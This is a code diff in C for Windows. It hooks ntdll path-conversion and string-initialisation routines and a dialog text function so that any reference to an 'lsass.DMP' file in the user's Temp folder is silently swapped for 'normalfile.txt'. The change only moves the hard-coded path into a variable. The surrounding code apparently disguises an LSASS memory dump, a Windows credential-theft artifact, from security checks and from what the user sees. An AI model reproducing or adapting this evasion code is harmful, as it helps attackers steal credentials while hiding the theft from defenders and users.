@@ -20,10 +20,11 @@ static NTSTATUS (NTAPI* Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus) (P
 static BOOL(WINAPI* pSetDlgItemTextW) (HWND hDlg, int nIDDlgItem, LPCWSTR lpString) = SetDlgItemTextW;
 
 PCWSTR newStr = L"C:\\Users\\djreu\\AppData\\Local\\Temp\\normalfile.txt";
+PCWSTR matchStr = L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP";
 
 static NTSTATUS NTAPI __stdcall hookedRtlDosPathNameToRelativeNtPathName_U_WithStatus (PCWSTR DosFileName, PUNICODE_STRING NtFileName, PCWSTR* FilePath, PRTL_RELATIVE_NAME_U RelativeName, PWSTR* FreeBuffer)
 {
-    if (lstrcmpiW(DosFileName, L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP") == 0)
+    if (lstrcmpiW(DosFileName, matchStr) == 0)
     {
         return Real_RtlDosPathNameToRelativeNtPathName_U_WithStatus(newStr, NtFileName, FilePath, RelativeName, FreeBuffer);
     }
@@ -32,7 +33,7 @@ static NTSTATUS NTAPI __stdcall hookedRtlDosPathNameToRelativeNtPathName_U_WithS
 
 static BOOLEAN NTAPI __stdcall hookedRtlDosPathNameToRelativeNtPathName_U(PCWSTR DosName, PUNICODE_STRING NtName, PCWSTR* PartName, PRTL_RELATIVE_NAME_U RelativeName)
 {
-    if (lstrcmpiW(DosName, L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP") == 0)
+    if (lstrcmpiW(DosName, matchStr) == 0)
     {
         return Real_RtlDosPathNameToRelativeNtPathName_U(newStr, NtName, PartName, RelativeName);
     }
@@ -41,7 +42,7 @@ static BOOLEAN NTAPI __stdcall hookedRtlDosPathNameToRelativeNtPathName_U(PCWSTR
 
 static VOID NTAPI __stdcall hookedRtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
 {
-    if (lstrcmpiW(SourceString, L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP") == 0)
+    if (lstrcmpiW(SourceString, matchStr) == 0)
     {
         return Real_RtlInitUnicodeString(DestinationString, newStr);
     }
@@ -50,7 +51,7 @@ static VOID NTAPI __stdcall hookedRtlInitUnicodeString(PUNICODE_STRING Destinati
 
 static NTSTATUS NTAPI __stdcall hookedRtlInitUnicodeStringEx(UNICODE_STRING* DestinationString, PCWSTR SourceString)
 {
-    if (lstrcmpiW(SourceString, L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP") == 0)
+    if (lstrcmpiW(SourceString, matchStr) == 0)
     {
         return Real_RtlInitUnicodeStringEx(DestinationString, newStr);
     }
@@ -59,7 +60,7 @@ static NTSTATUS NTAPI __stdcall hookedRtlInitUnicodeStringEx(UNICODE_STRING* Des
 
 BOOL hookedSetDlgItemTextW(HWND hDlg, int nIDDlgItem, LPCWSTR lpString)
 {
-    if (wcscmp(lpString, L"C:\\Users\\djreu\\AppData\\Local\\Temp\\lsass.DMP") == 0)
+    if (wcscmp(lpString, matchStr) == 0)
     {
         return pSetDlgItemTextW(hDlg, nIDDlgItem, (LPCWSTR)newStr);
     }
